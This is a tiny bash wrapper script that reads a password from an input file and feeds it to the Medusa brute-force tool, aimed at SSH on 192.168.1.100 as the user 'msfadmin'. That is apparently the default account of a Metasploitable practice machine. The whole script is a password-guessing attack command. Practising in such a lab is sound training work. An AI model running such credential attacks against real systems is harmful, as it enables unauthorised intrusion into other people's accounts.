#!/bin/bash
# wrapper.sh

# Read input file
input_file="$1"

# Extract data from input file
password=$(head -n 1 "$input_file")
# username=$(head -n 2 "$input_file" | tail -n 1)
# password=$(head -n 3 "$input_file" | tail -n 1)

# Run Medusa with extracted data
medusa -h 192.168.1.100 -u msfadmin -p "$password" -M ssh -n 22
